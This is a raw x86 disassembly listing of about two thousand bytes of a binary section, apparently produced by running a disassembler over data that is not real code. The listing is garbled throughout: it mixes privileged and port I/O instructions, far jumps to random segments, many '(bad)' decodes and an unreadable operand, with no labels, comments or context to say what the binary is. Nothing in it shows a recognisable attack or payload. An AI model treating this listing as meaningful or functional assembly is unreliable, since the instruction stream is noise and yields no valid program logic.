  40e307:	ss popf 
  40e309:	push   edi
  40e30a:	(bad)  
  40e30b:	jbe    0x40e34b
  40e30d:	pop    es
  40e30e:	adc    esp,DWORD PTR [esi+ebp*1-0xc]
  40e312:	das    
  40e313:	pusha  
  40e314:	scas   eax,DWORD PTR es:[edi]
  40e315:	in     al,dx
  40e316:	sub    dh,cl
  40e318:	add    BYTE PTR [eax+0x3a],0x83
  40e31c:	(bad)
  40e320:	add    dh,dh
  40e322:	xchg   esp,eax
  40e323:	imul   esp,edi,0xa4f911cc
  40e329:	mov    DWORD PTR [esi],0xa8f714c
  40e32f:	mov    DWORD PTR [edx],ebx
  40e331:	out    dx,al
  40e332:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e333:	cli    
  40e334:	jmp    0xab6f:0x1c9e61c8
  40e33b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e33c:	mov    cl,0xf8
  40e33e:	xor    DWORD PTR es:[eax-0xc],edx
  40e342:	or     eax,ebx
  40e344:	int3   
  40e345:	xor    dh,BYTE PTR [edx+ecx*2+0x5d8f8]
  40e34c:	clc    
  40e34d:	push   ecx
  40e34e:	xor    dh,BYTE PTR [edi-0x51]
  40e351:	leave  
  40e352:	int3   
  40e353:	jns    0x40e2e8
  40e355:	xor    BYTE PTR [eax+0x5e],ch
  40e358:	push   es
  40e359:	mov    BYTE PTR [esi+0x9],0xb3
  40e35d:	mov    ah,0xe1
  40e35f:	jmp    0x233f:0x8ba7788b
  40e366:	je     0x40e3ca
  40e368:	out    dx,al
  40e369:	leave  
  40e36a:	and    DWORD PTR [eax],ebp
  40e36c:	jmp    0x40e3d5
  40e36e:	adc    eax,DWORD PTR [esi-0x6]
  40e371:	call   0xd8ba3222
  40e376:	pop    ds
  40e377:	push   ebx
  40e378:	div    BYTE PTR cs:[edx-0x12]
  40e37c:	(bad)  
  40e37d:	ja     0x40e3e2
  40e37f:	sar    ebp,0x3a
  40e382:	loop   0x40e3c2
  40e384:	lods   eax,DWORD PTR ds:[esi]
  40e385:	sub    DWORD PTR gs:[edx],eax
  40e388:	and    ah,BYTE PTR [ebp+esi*2-0x4d]
  40e38c:	push   es
  40e38d:	in     al,0xc2
  40e38f:	mov    edi,0xc106b2ae
  40e394:	xchg   edi,eax
  40e395:	mov    BYTE PTR [ebx],0x94
  40e398:	dec    ecx
  40e399:	mov    DWORD PTR [eax+0x70],0xf8bcfc20
  40e3a0:	push   ecx
  40e3a1:	sahf   
  40e3a2:	ror    BYTE PTR es:[ebp-0x54],cl
  40e3a6:	sar    ebp,0x44
  40e3a9:	rcr    dl,0x60
  40e3ac:	mov    ebp,0xc5a88891
  40e3b1:	mov    ds:0x7e703c6b,eax
  40e3b6:	sti    
  40e3b7:	ret    0x7966
  40e3ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e3bb:	rol    DWORD PTR [esi-0x21],cl
  40e3be:	pop    ecx
  40e3bf:	jge    0x40e3a8
  40e3c1:	and    eax,0xd96de417
  40e3c6:	(bad)  
  40e3c7:	in     al,dx
  40e3c8:	xor    BYTE PTR [eax+0x1a615694],bh
  40e3ce:	nop
  40e3cf:	jns    0x40e403
  40e3d1:	mov    bl,0x97
  40e3d3:	add    ch,BYTE PTR [edi+eax*2]
  40e3d6:	lods   eax,DWORD PTR ds:[esi]
  40e3d7:	mov    eax,0x1b003f98
  40e3dc:	lahf   
  40e3dd:	iret   
  40e3de:	push   0xd04c303b
  40e3e3:	hlt    
  40e3e4:	int    0x2e
  40e3e6:	xor    esi,edx
  40e3e8:	push   ds
  40e3e9:	scas   al,BYTE PTR es:[edi]
  40e3ea:	jmp    0xb4f7:0x430a545c
  40e3f1:	adc    DWORD PTR es:[ebx+0x4d],edx
  40e3f5:	mov    edi,0x5cf7c5f4
  40e3fa:	shl    DWORD PTR [edi],1
  40e3fc:	xor    BYTE PTR [ebx-0x5116e1c6],bh
  40e402:	mov    cl,0x4e
  40e404:	fistp  WORD PTR [edx+0x1e240c74]
  40e40a:	daa    
  40e40b:	mov    BYTE PTR [edx+edi*2+0x7a],ch
  40e40f:	pop    ecx
  40e410:	clc    
  40e411:	jo     0x40e3e2
  40e413:	mov    ecx,DWORD PTR [ebp+0x71]
  40e416:	adc    esp,DWORD PTR [edi-0x26]
  40e419:	push   edx
  40e41a:	retf   
  40e41b:	fcom   DWORD PTR [edi-0x67cb009f]
  40e421:	cld    
  40e422:	sub    DWORD PTR [ecx],0xb
  40e425:	add    al,0x13
  40e427:	daa    
  40e428:	cmp    eax,0xd241c2b8
  40e42d:	dec    ebx
  40e42e:	adc    eax,0xd153e067
  40e433:	repz ss pop es
  40e436:	push   ecx
  40e437:	and    ch,BYTE PTR [edx]
  40e439:	mov    DWORD PTR [esp+edi*8+0x42ae4897],edx
  40e440:	sub    cl,cl
  40e442:	out    0xd9,al
  40e444:	ss xchg edi,eax
  40e446:	xor    esp,0xef837b81
  40e44c:	lea    edi,[eax-0x54]
  40e44f:	jmp    0xfd1ebcf2
  40e454:	jbe    0x40e4d3
  40e456:	jo     0x40e48a
  40e458:	sub    eax,0x4cb56a61
  40e45d:	fsubr  st,st(3)
  40e45f:	sti    
  40e460:	fxch   st(2)
  40e462:	shl    DWORD PTR [ebx+0x71f77ff7],cl
  40e468:	or     eax,0x7c821301
  40e46d:	test   eax,0xc76e5d2a
  40e472:	(bad)  
  40e474:	cmp    al,0xf0
  40e476:	mov    dl,0x25
  40e479:	fimul  WORD PTR [edx-0x5baa060]
  40e47f:	in     al,0xbc
  40e481:	test   eax,0x9de7085c
  40e486:	xchg   ebp,eax
  40e487:	mov    cl,0x7b
  40e489:	or     BYTE PTR [esp+ebx*8],ah
  40e48c:	add    ebp,esi
  40e48e:	or     edx,DWORD PTR [edx]
  40e490:	test   DWORD PTR [ecx+edi*4+0x84bce6],0x70ef0902
  40e49b:	add    al,0x43
  40e49d:	sub    DWORD PTR [ebp-0x30],edx
  40e4a0:	jbe    0x40e462
  40e4a2:	jbe    0x40e4e7
  40e4a4:	hlt    
  40e4a5:	xchg   ecx,eax
  40e4a6:	popf   
  40e4a7:	mov    eax,ds:0x5291a0f3
  40e4ac:	clc    
  40e4ad:	scas   eax,DWORD PTR es:[edi]
  40e4ae:	push   es
  40e4af:	icebp  
  40e4b0:	and    ecx,DWORD PTR [eax]
  40e4b2:	jecxz  0x40e527
  40e4b4:	fs stc 
  40e4b6:	(bad)  
  40e4b7:	push   esp
  40e4b8:	mov    BYTE PTR [ebx+0x54],bl
  40e4bb:	sbb    ax,0x7027
  40e4bf:	add    dl,BYTE PTR [edx-0x44f170c2]
  40e4c5:	jmp    0xafec4217
  40e4ca:	jp     0x40e4d1
  40e4cc:	or     eax,0xcc3843e4
  40e4d1:	hlt    
  40e4d2:	adc    al,0xdd
  40e4d4:	lahf   
  40e4d5:	fs mov ebp,0x3b4e6cf2
  40e4db:	jae    0x40e4a5
  40e4dd:	mov    ds:0xf36af57e,eax
  40e4e2:	adc    eax,0x5905bc03
  40e4e7:	popf   
  40e4e8:	inc    ecx
  40e4e9:	shl    ebx,0x2a
  40e4ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e4ed:	int    0xa
  40e4ef:	or     DWORD PTR [esi+0x69d58bd4],ecx
  40e4f5:	or     eax,0x205bbae
  40e4fa:	ret    0x794f
  40e4fd:	xchg   DWORD PTR [edi-0x6a5025cf],edx
  40e503:	and    DWORD PTR [edx],edi
  40e505:	inc    edi
  40e506:	mov    ecx,0xf00a199d
  40e50b:	ja     0x40e49c
  40e50d:	jns    0x40e57e
  40e50f:	je     0x40e573
  40e511:	ret    
  40e512:	js     0x40e4e6
  40e514:	neg    DWORD PTR [ebx+0x54]
  40e517:	in     eax,0xae
  40e519:	outs   dx,BYTE PTR ds:[esi]
  40e51a:	and    DWORD PTR [eax],edx
  40e51c:	add    dh,bl
  40e51e:	mov    ecx,DWORD PTR ds:0x78a5732e
  40e524:	out    0x81,al
  40e526:	imul   ecx,DWORD PTR [edi+0x5dfa87b5],0xfffffff8
  40e52d:	imul   esi,DWORD PTR [eax-0x66],0xffffff84
  40e531:	xor    al,0x80
  40e533:	xor    ebx,esp
  40e535:	or     dh,ah
  40e537:	or     cl,ah
  40e539:	pop    eax
  40e53a:	mov    ebp,0xafaf6550
  40e53f:	ins    BYTE PTR es:[edi],dx
  40e540:	repz sub eax,0x23b06334
  40e546:	dec    esp
  40e547:	push   ss
  40e548:	add    DWORD PTR [esi],0x2f82783c
  40e54e:	(bad)  
  40e54f:	in     eax,dx
  40e550:	mov    al,ds:0x8f6f9b83
  40e555:	mov    ah,0x11
  40e557:	lods   al,BYTE PTR ds:[esi]
  40e558:	pop    ebx
  40e559:	(bad)  
  40e55b:	inc    ecx
  40e55c:	inc    edx
  40e55d:	stc    
  40e55e:	das    
  40e55f:	clc    
  40e560:	int3   
  40e561:	retf   0x7808
  40e564:	idiv   BYTE PTR [edi]
  40e566:	sub    DWORD PTR [ebp+0x3c4c6e49],esp
  40e56c:	out    0x99,al
  40e56e:	lahf   
  40e56f:	jb     0x40e5bf
  40e571:	mov    esp,0x7031f2af
  40e576:	ret    
  40e577:	nop
  40e578:	pushf  
  40e579:	cmp    BYTE PTR [edi+ebp*8+0x37b6f7b8],dl
  40e580:	sahf   
  40e581:	jnp    0x40e515
  40e583:	mov    ah,BYTE PTR ss:[edi-0x55]
  40e587:	pop    eax
  40e588:	rol    ch,1
  40e58a:	lock int 0x63
  40e58d:	aas    
  40e58e:	pop    esp
  40e58f:	lods   eax,DWORD PTR ds:[esi]
  40e590:	lahf   
  40e591:	loope  0x40e604
  40e593:	fild   WORD PTR [bp-0x6]
  40e597:	les    esp,FWORD PTR [ecx-0x52a9ba95]
  40e59d:	imul   cl
  40e59f:	push   eax
  40e5a0:	scas   eax,DWORD PTR es:[edi]
  40e5a1:	inc    ecx
  40e5a2:	test   edi,edi
  40e5a4:	push   ds
  40e5a5:	je     0x40e5d5
  40e5a7:	scas   eax,DWORD PTR es:[edi]
  40e5a8:	push   edi
  40e5a9:	jecxz  0x40e5d6
  40e5ab:	ins    BYTE PTR es:[edi],dx
  40e5ac:	adc    ah,BYTE PTR [edi+0x36]
  40e5af:	addr16 jg 0x40e5d8
  40e5b2:	add    esp,DWORD PTR [eax]
  40e5b4:	xchg   ecx,eax
  40e5b5:	mov    edx,0x73c25407
  40e5ba:	fldenv [ebx+0x7fc11d28]
  40e5c0:	mov    dh,0x1e
  40e5c2:	jae    0x40e63d
  40e5c4:	sahf   
  40e5c5:	xchg   BYTE PTR [ecx+0x59],al
  40e5c8:	xor    DWORD PTR [eiz*2+0x4a7c398b],edi
  40e5cf:	hlt    
  40e5d0:	sbb    bl,BYTE PTR [esi+0x677de680]
  40e5d6:	and    bh,BYTE PTR [ecx+eiz*4-0x72]
  40e5da:	dec    ebx
  40e5db:	pop    esp
  40e5dc:	push   esp
  40e5dd:	add    eax,0xb5aeb0da
  40e5e2:	mov    dl,0xa6
  40e5e4:	mov    al,0x9a
  40e5e6:	(bad)  
  40e5e7:	cld    
  40e5e8:	adc    BYTE PTR [eax-0x7ee6d505],0xd0
  40e5ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e5f0:	inc    ebp
  40e5f1:	cld    
  40e5f2:	ret    0x9e99
  40e5f5:	clc    
  40e5f6:	or     eax,0xa7c3a48
  40e5fb:	push   0x6b2c1608
  40e600:	and    eax,0xa8175d5f
  40e605:	push   esp
  40e606:	push   ecx
  40e607:	nop
  40e608:	imul   eax,edi,0xfab518c5
  40e60e:	xchg   edi,eax
  40e60f:	mov    bh,0x21
  40e611:	clc    
  40e612:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e613:	sar    DWORD PTR [ebp-0x6393dd70],0x9b
  40e61a:	jl     0x40e62f
  40e61c:	ins    DWORD PTR es:[edi],dx
  40e61d:	aam    0x4f
  40e61f:	xor    DWORD PTR [ebp-0x6f],eax
  40e622:	cmp    esp,DWORD PTR [eax-0x7]
  40e625:	pop    ecx
  40e626:	jg     0x40e633
  40e628:	adc    edx,DWORD PTR [ebx+0x5b]
  40e62b:	sbb    DWORD PTR [edx+0x22],edx
  40e62e:	xor    DWORD PTR [ebp-0x33],edx
  40e631:	xlat   BYTE PTR ds:[ebx]
  40e632:	dec    ebx
  40e633:	outs   dx,DWORD PTR ds:[esi]
  40e634:	je     0x40e690
  40e636:	das    
  40e637:	sub    ch,BYTE PTR [eax+eax*8]
  40e63a:	or     al,0xdf
  40e63c:	push   ds
  40e63d:	jno    0x40e63c
  40e63f:	xor    BYTE PTR [edi],dl
  40e641:	inc    edi
  40e642:	mov    bh,0x14
  40e644:	outs   dx,DWORD PTR ds:[esi]
  40e645:	hlt    
  40e646:	int3   
  40e647:	fist   WORD PTR [edi]
  40e649:	repnz and al,0x78
  40e64c:	(bad)  
  40e64d:	arpl   WORD PTR [ecx],cx
  40e64f:	pop    eax
  40e650:	jne    0x40e64f
  40e652:	xor    eax,0x37a71dc0
  40e657:	inc    esi
  40e658:	push   esi
  40e659:	jmp    0x2b5c:0x2cc5aa4
  40e660:	cmp    al,0x39
  40e662:	mov    dh,BYTE PTR [ebp-0x329e9090]
  40e668:	dec    edx
  40e669:	adc    DWORD PTR [edx-0x6f1c2c9e],0x47
  40e670:	imul   esi,DWORD PTR [ebp+0x42],0x3e
  40e674:	push   es
  40e675:	mov    ebx,0xb6ecf4c6
  40e67a:	mov    dl,0x10
  40e67c:	gs in  al,dx
  40e67e:	mov    bl,0xf3
  40e680:	sbb    ah,dl
  40e682:	outs   dx,DWORD PTR ds:[esi]
  40e683:	out    dx,eax
  40e684:	pop    ds
  40e685:	mov    ss,WORD PTR [ebp-0x7170c409]
  40e68b:	inc    ebx
  40e68c:	pop    DWORD PTR [edi+0x3c559138]
  40e692:	in     al,0xd7
  40e694:	pop    esp
  40e695:	sub    al,0x6f
  40e697:	cmp    al,0x84
  40e699:	popa   
  40e69a:	cmp    DWORD PTR [ebx-0x1e7d0bed],0x4e
  40e6a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6a2:	jg     0x40e656
  40e6a4:	int3   
  40e6a5:	sbb    DWORD PTR [ebx-0x24],0x65
  40e6a9:	xchg   esi,eax
  40e6aa:	add    eax,0x9725a980
  40e6af:	mov    ah,0x80
  40e6b1:	dec    esi
  40e6b3:	cmp    DWORD PTR [esi+0x8a18972],edx
  40e6b9:	mov    edx,0xaf3ec24a
  40e6be:	ror    BYTE PTR [ebx+0xf82a1fc],cl
  40e6c4:	inc    ebx
  40e6c5:	fmul   DWORD PTR [ecx-0x6dfb20b3]
  40e6cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e6cc:	adc    BYTE PTR [bx],bh
  40e6cf:	cs push 0xb2273299
  40e6d5:	lods   al,BYTE PTR ds:[esi]
  40e6d6:	mov    dl,0x91
  40e6d8:	arpl   cx,sp
  40e6da:	or     al,0xdc
  40e6dc:	std    
  40e6dd:	repz mov esp,0x1b7beebf
  40e6e3:	rol    BYTE PTR [ecx+0x3da61db8],0x15
  40e6ea:	mov    eax,ds:0x26eb6154
  40e6ef:	dec    esi
  40e6f0:	mov    ch,0x95
  40e6f2:	xchg   esi,eax
  40e6f3:	adc    BYTE PTR [edi-0x6a],bh
  40e6f6:	sbb    esi,DWORD PTR [ebx]
  40e6f8:	xor    ebp,esi
  40e6fa:	call   0xb556330b
  40e6ff:	shr    BYTE PTR [ebp-0x2a],cl
  40e702:	xor    al,0x5a
  40e704:	out    dx,al
  40e705:	add    ebx,DWORD PTR [edx+0x5447ed73]
  40e70b:	sbb    dl,bl
  40e70d:	jle    0x40e68f
  40e70f:	out    0x6a,al
  40e711:	jno    0x40e6a7
  40e713:	push   0xfffffffc
  40e715:	js     0x40e747
  40e717:	push   esp
  40e718:	fwait
  40e719:	and    esi,edi
  40e71b:	pop    ds
  40e71c:	rcr    DWORD PTR [esi+0x3aa0ff7f],cl
  40e722:	out    0xa1,eax
  40e724:	sbb    DWORD PTR [edx],0x8
  40e727:	sub    eax,0xfd7548da
  40e72c:	adc    DWORD PTR ds:0xba7b777d,eax
  40e732:	ins    DWORD PTR es:[edi],dx
  40e733:	fwait
  40e734:	ja     0x40e7b4
  40e736:	adc    eax,0x92c2a342
  40e73b:	inc    BYTE PTR [ebx+0x73b4e450]
  40e741:	cmp    eax,0x1b
  40e744:	call   0x5ba3:0xd449af7d
  40e74b:	dec    ebp
  40e74c:	sbb    BYTE PTR [ebp-0x7f],bl
  40e74f:	and    al,0x86
  40e751:	sub    ch,dh
  40e753:	pop    esi
  40e754:	mov    edx,0x304cf45f
  40e759:	jb     0x40e77d
  40e75b:	mov    dl,0x8
  40e75d:	mov    ah,0x51
  40e75f:	fild   WORD PTR [edi-0x46]
  40e762:	call   0xb246ba9
  40e767:	mov    ds:0x72e27f16,eax
  40e76c:	push   esi
  40e76d:	or     BYTE PTR [ebp+0x45cddf1c],cl
  40e773:	lahf   
  40e774:	xor    BYTE PTR [eax+ebx*4+0x5a51040c],0x37
  40e77c:	mov    bl,0x65
  40e77e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e77f:	popa   
  40e780:	pop    edx
  40e781:	mov    edi,0x8206ea4
  40e786:	xchg   edx,eax
  40e787:	gs cmp al,0x68
  40e78a:	call   0xd820:0x2647f7de
  40e791:	pop    edi
  40e792:	adc    DWORD PTR gs:[esi-0x4e],esi
  40e796:	aam    0xb2
  40e798:	loop   0x40e7ce
  40e79a:	in     eax,0x44
  40e79c:	and    al,0x46
  40e79e:	adc    eax,0x3a47018
  40e7a3:	jecxz  0x40e744
  40e7a5:	into   
  40e7a6:	cmp    DWORD PTR [edi-0x548e11b9],edx
  40e7ac:	sbb    BYTE PTR [edi+0x72],al
  40e7af:	and    eax,0xcde3c91
  40e7b4:	popa   
  40e7b5:	bound  edi,QWORD PTR [esi-0x18cac14d]
  40e7bb:	add    BYTE PTR [ebp-0x1e510277],ch
  40e7c1:	jae    0x40e760
  40e7c3:	adc    esi,esp
  40e7c5:	mov    esp,0xd38632ad
  40e7ca:	call   0x976c:0x9fc51673
  40e7d1:	dec    ecx
  40e7d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e7d3:	mov    dh,0xd4
  40e7d5:	gs (bad) 
  40e7d7:	fstp   QWORD PTR [eax+0x57117142]
  40e7dd:	sub    DWORD PTR [ebp-0x45],esp
  40e7e0:	push   ebx
  40e7e1:	ins    BYTE PTR es:[edi],dx
  40e7e2:	mov    esp,0x38167ef3
  40e7e7:	bts    DWORD PTR es:0x47b5e4e9,edi
  40e7ef:	(bad)  
  40e7f0:	xchg   ecx,eax
  40e7f1:	sti    
  40e7f2:	inc    ecx
  40e7f3:	dec    eax
  40e7f4:	inc    edx
  40e7f5:	or     bh,ch
  40e7f7:	mov    ebp,0xa7727c46
  40e7fc:	pop    eax
  40e7fd:	add    BYTE PTR [ecx+ebx*8+0x62],0xcc
  40e802:	xchg   esp,eax
  40e803:	mov    ds:0xb384dbe5,eax
  40e808:	ffreep st(4)
  40e80a:	mov    edi,0xb7299262
  40e80f:	or     eax,0x4afa54e4
  40e814:	aad    0xc8
  40e816:	xchg   edi,eax
  40e817:	mov    edx,0x30beb9fa
  40e81c:	pushf  
  40e81d:	push   edi
  40e81e:	inc    ebp
  40e81f:	lahf   
  40e820:	push   esp
  40e821:	adc    al,BYTE PTR [ecx+ebp*2-0x62]
  40e825:	push   edx
  40e826:	hlt    
  40e827:	dec    edx
  40e828:	xor    eax,0x447dfc7b
  40e82d:	push   es
  40e82e:	daa    
  40e82f:	mov    al,BYTE PTR [bp+di+0x49c8]
  40e834:	and    cl,cl
  40e836:	xchg   ebx,eax
  40e837:	cdq    
  40e838:	imul   eax,DWORD PTR [esi-0x1e1846fa],0xa81dda08
  40e842:	inc    ebp
  40e843:	js     0x40e818
  40e845:	ds inc esp
  40e847:	mov    ds:0x222a1602,eax
  40e84c:	sbb    al,0x6d
  40e84e:	inc    esp
  40e84f:	sar    DWORD PTR [esi+0x3b],1
  40e852:	jmp    0xa25dd52d
  40e857:	adc    DWORD PTR [ebx+0x9977242],ebx
  40e85d:	jbe    0x40e8d2
  40e85f:	dec    edi
  40e860:	out    dx,al
  40e861:	inc    esp
  40e862:	hlt    
  40e863:	jl     0x40e82c
  40e865:	fisub  WORD PTR [eax-0x11]
  40e868:	fbstp  TBYTE PTR [ebx]
  40e86a:	pop    es
  40e86b:	lods   eax,DWORD PTR ds:[esi]
  40e86c:	jmp    0x884d08ad
  40e871:	mov    ds:0x866674e9,al
  40e876:	pop    ss
  40e877:	adc    ebx,DWORD PTR [ebx+edi*8-0x1162b3a7]
  40e87e:	adc    al,0x80
  40e880:	sub    ch,BYTE PTR [ecx]
  40e882:	addr16 and edx,0xffffffce
  40e886:	xor    eax,0x39b5b38d
  40e88b:	stc    
  40e88c:	repnz (bad) 
  40e88e:	in     eax,dx
  40e88f:	and    bl,al
  40e891:	mov    eax,ds:0x7cc8b3c4
  40e896:	push   es
  40e897:	les    ebp,FWORD PTR [edx]
  40e899:	jle    0x40e893
  40e89b:	sbb    al,0x78
  40e89d:	aam    0xc3
  40e89f:	push   eax
  40e8a0:	add    al,0x56
  40e8a2:	sub    esp,edi
  40e8a4:	lods   al,BYTE PTR ds:[esi]
  40e8a5:	inc    ebx
  40e8a6:	adc    BYTE PTR [edi+0x52c46e1f],bl
  40e8ac:	int3   
  40e8ad:	mov    esi,0x3e3625e9
  40e8b2:	mov    esp,0xb92a02bb
  40e8b7:	rcr    DWORD PTR [edi+0xe],1
  40e8ba:	(bad)  
  40e8bb:	cdq    
  40e8bc:	sbb    dh,BYTE PTR [edx+ebx*4]
  40e8bf:	and    ecx,ecx
  40e8c1:	sbb    eax,0x3e8f3142
  40e8c6:	dec    si
  40e8c9:	mov    esi,0xfb110bd7
  40e8ce:	pop    ss
  40e8cf:	cli    
  40e8d0:	pop    esp
  40e8d1:	xor    dl,BYTE PTR [eax]
  40e8d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e8d4:	or     edi,esi
  40e8d6:	inc    esp
  40e8d7:	pop    ss
  40e8d8:	je     0x40e92c
  40e8da:	xor    cl,BYTE PTR [eax+0x2e]
  40e8dd:	mov    bl,0xa8
  40e8df:	shl    bl,1
  40e8e1:	add    eax,0x9bdbaeea
  40e8e6:	out    0xc,eax
  40e8e8:	ret    0x1d90
  40e8eb:	mov    BYTE PTR [ebp+edx*1-0x492316a4],dh
  40e8f2:	jno    0x40e94b
  40e8f4:	mov    bh,0x78
  40e8f6:	scas   al,BYTE PTR es:[edi]
  40e8f7:	fwait
  40e8f8:	xchg   ebp,eax
  40e8f9:	sub    edx,DWORD PTR [edi-0x7ec12561]
  40e8ff:	jmp    0x5c80:0x479969ad
  40e906:	cld    
  40e907:	out    0xb0,eax
  40e909:	or     eax,0x630dcae7
  40e90e:	lods   al,BYTE PTR ds:[esi]
  40e90f:	scas   al,BYTE PTR es:[edi]
  40e910:	aas    
  40e911:	mov    cl,0xf
  40e913:	push   es
  40e914:	mov    dh,ah
  40e916:	mov    ebx,0xfd9394a9
  40e91b:	push   0xa026c69b
  40e920:	hlt    
  40e921:	sub    edx,DWORD PTR [ebx+eiz*1]
  40e924:	das    
  40e925:	adc    al,BYTE PTR [ecx+0x14]
  40e928:	dec    edi
  40e929:	push   ss
  40e92a:	mov    eax,ds:0xb83b92f4
  40e92f:	ret    
  40e930:	cmp    ah,BYTE PTR [ecx+edx*8-0xef36d8e]
  40e937:	mov    ebp,0xf33ec30c
  40e93c:	lds    edx,FWORD PTR [eax]
  40e93e:	ror    edx,cl
  40e940:	popa   
  40e941:	and    esp,DWORD PTR [ebx+0x7]
  40e944:	jmp    0xb79d:0x19430d8c
  40e94b:	mov    eax,ds:0x2654feda
  40e950:	pop    es
  40e951:	mov    ds:0xa6a611e1,eax
  40e956:	cs jmp 0x79f5:0x897f8560
  40e95e:	xchg   ecx,eax
  40e95f:	jle    0x40e975
  40e961:	loop   0x40e99e
  40e963:	retf   0x1920
  40e966:	or     al,0x1d
  40e968:	mov    WORD PTR [eiz*2-0x40b525be],gs
  40e96f:	and    DWORD PTR [ebp+0x1b],eax
  40e972:	dec    edi
  40e973:	sar    DWORD PTR [ebx-0x75],cl
  40e976:	pop    es
  40e977:	mov    edi,0x398fd73e
  40e97c:	iret   
  40e97d:	add    dl,BYTE PTR [esi]
  40e97f:	cmp    al,BYTE PTR [edx+0x3d]
  40e982:	popf   
  40e983:	(bad)  
  40e984:	loopne 0x40e921
  40e986:	ret    
  40e987:	push   eax
  40e988:	cmp    ebp,edx
  40e98a:	xlat   BYTE PTR ds:[ebx]
  40e98b:	jbe    0x40e9e7
  40e98d:	mov    esi,DWORD PTR [eax+0x570eb6b2]
  40e993:	or     BYTE PTR [ebp-0x29],dh
  40e996:	mov    esi,DWORD PTR [ecx-0x77]
  40e999:	cli    
  40e99a:	cwde   
  40e99b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e99c:	xchg   esp,eax
  40e99d:	ins    BYTE PTR es:[edi],dx
  40e99e:	lea    ebx,[ebp-0x39]
  40e9a1:	dec    ebx
  40e9a2:	and    BYTE PTR [eax+0x1f],cl
  40e9a5:	aaa    
  40e9a6:	sub    esi,DWORD PTR [edi-0x49]
  40e9a9:	or     ah,BYTE PTR [ebx-0x228a3d00]
  40e9af:	push   es
  40e9b0:	mov    esp,0x54c1abd3
  40e9b5:	inc    ebx
  40e9b6:	fnstcw WORD PTR [esi+ebx*4+0x4807e7a8]
  40e9bd:	nop/reserved BYTE PTR [esi-0x621cb02a]
  40e9c4:	pop    edi
  40e9c5:	adc    BYTE PTR [esi],0xcc
  40e9c8:	stos   DWORD PTR es:[di],eax
  40e9ca:	jo     0x40ea05
  40e9cc:	add    dh,dl
  40e9ce:	fwait
  40e9cf:	popa   
  40e9d0:	test   DWORD PTR [ebx+0x3e],esp
  40e9d3:	mov    cl,0x1b
  40e9d5:	(bad)  
  40e9d6:	sub    al,0x72
  40e9d8:	hlt    
  40e9d9:	scas   eax,DWORD PTR es:[edi]
  40e9da:	sbb    eax,0x6677cb43
  40e9df:	xor    DWORD PTR [ecx+eiz*1],0x2bf79f51
  40e9e6:	lods   al,BYTE PTR ds:[esi]
  40e9e7:	mov    esi,0xcd48698e
  40e9ec:	test   BYTE PTR [edx-0x56651ff7],al
  40e9f2:	call   0x45b8:0xd933ec23
  40e9f9:	xchg   ebx,eax
  40e9fa:	lahf   
  40e9fb:	mov    bl,0x7
  40e9fd:	dec    edi
  40e9fe:	int3   
  40e9ff:	push   ds
  40ea00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea01:	aaa    
  40ea02:	ss stos BYTE PTR es:[edi],al
  40ea04:	pusha  
  40ea05:	wrmsr  
  40ea07:	mov    esp,0x2c5682c8
  40ea0c:	or     eax,esi
  40ea0e:	popf   
  40ea0f:	pop    es
  40ea10:	imul   edi
  40ea12:	aas    
  40ea13:	(bad)  
  40ea14:	cmp    al,0xf7
  40ea16:	pop    ebp
  40ea17:	mov    ebx,0x87773168
  40ea1c:	or     BYTE PTR [esp+ecx*8],dh
  40ea1f:	call   0x8b0a4523
  40ea24:	loop   0x40ea04
  40ea26:	mov    ?,WORD PTR [esi+0x4d]
  40ea29:	inc    ebp
  40ea2a:	or     eax,0xe7255d85
  40ea2f:	std    
  40ea30:	popf   
  40ea31:	pop    esi
  40ea32:	push   ebp
  40ea33:	xchg   edi,eax
  40ea34:	das    
  40ea35:	jo     0x40ea95
  40ea37:	xor    DWORD PTR [ebp+0x45],eax
  40ea3a:	xor    al,0x9a
  40ea3c:	fcom   st(1)
  40ea3e:	loope  0x40ea6a
  40ea40:	xor    bl,BYTE PTR [ebx+0x6e328afb]
  40ea46:	in     al,0xb3
  40ea48:	xchg   ebx,eax
  40ea49:	pop    edx
  40ea4a:	push   edi
  40ea4b:	clc    
  40ea4c:	into   
  40ea4d:	push   ebp
  40ea4e:	imul   ebx,DWORD PTR [eiz*8+0x3ba4d2a1],0x695bb9f2
  40ea59:	xor    ebp,0x39
  40ea5c:	dec    esp
  40ea5d:	fisttp QWORD PTR [ecx+0x6f]
  40ea60:	pop    esi
  40ea61:	xchg   ebp,eax
  40ea62:	pop    eax
  40ea63:	sub    ebx,DWORD PTR [eax+0x7f]
  40ea66:	sub    ch,BYTE PTR [ebx+0x17]
  40ea69:	outs   dx,DWORD PTR ds:[esi]
  40ea6a:	and    DWORD PTR [ebx],eax
  40ea6c:	outs   dx,BYTE PTR ds:[esi]
  40ea6d:	sub    al,0x77
  40ea6f:	ss mov ebx,0x1f79c80c
  40ea75:	and    al,0x26
  40ea77:	das    
  40ea78:	mov    eax,ds:0x2fafa1e7
  40ea7d:	add    eax,0x5b74cd78
  40ea82:	or     BYTE PTR [ecx],ah
  40ea84:	xor    dh,BYTE PTR [ebp+0x7852583b]
  40ea8a:	push   eax
  40ea8b:	inc    edi
  40ea8c:	push   0xd1ce47c
  40ea91:	stos   BYTE PTR es:[edi],al
  40ea92:	popf   
  40ea93:	out    dx,al
  40ea94:	jbe    0x40ead0
  40ea96:	jo     0x40eafd
  40ea98:	frstor [ecx]
  40ea9a:	ret    0x2e7b
  40ea9d:	into   
  40ea9e:	pop    edx
  40ea9f:	pop    esi
  40eaa0:	push   esp
  40eaa1:	sub    DWORD PTR [edx+edi*8-0x69a2f845],esi
  40eaa8:	xor    eax,0xdadf5ed7
  40eaad:	sub    DWORD PTR [eax+0x2efe6915],edi
  40eab3:	sbb    esp,edx
  40eab5:	adc    bl,BYTE PTR [ecx-0x7f]
